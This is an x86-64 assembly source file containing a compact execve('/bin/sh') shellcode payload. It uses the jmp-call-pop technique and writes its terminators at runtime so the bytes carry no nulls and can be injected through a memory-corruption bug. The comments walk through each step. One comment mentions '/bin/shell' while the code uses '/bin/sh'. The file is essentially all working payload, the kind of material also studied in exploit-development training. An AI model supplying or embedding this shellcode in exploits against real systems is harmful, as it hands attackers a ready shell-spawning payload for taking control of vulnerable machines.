BITS 64

global _start
jmp short t

_start:

	; To call execve with shell, we need the program's name, an array of the name and then
	;	a NULL and a pointer to a NULL.
	; Since we can't retminate the string and add NULLs in the code (to prevent)
	;	nullbytes), we'll generate them dynamically
	xor rax, rax
	pop rdi ; rbx = &msg
	mov [rdi + 7], al ; Null terminate the string
	mov [rdi + 8], rdi ; Put the address of the string instead of the AAAAAAAA
	mov [rdi + 16], rax ; Put a NULL instead of the BBBBBBBB, to mark the end of arr

	; Put values in registers for syscall. String's address is already in rdi
	lea rsi, [rdi + 8] ; put the array address in rdi
	lea rdx, [rdi + 16] ; Put the NULL address in rdx

	mov al, 59 ; the execve syscall number
	syscall

	; exit properly
	; mov al, 60
	; xor rdi, rdi
	; syscall

t:
	call _start
	; X is a place holder for a NULL string terminator, AAAAAAAA is for the address
	;	of the string "/bin/shell" and BBBBBBBB is for a NULL array terminator
	msg db "/bin/shXAAAAAAAABBBBBBBB"
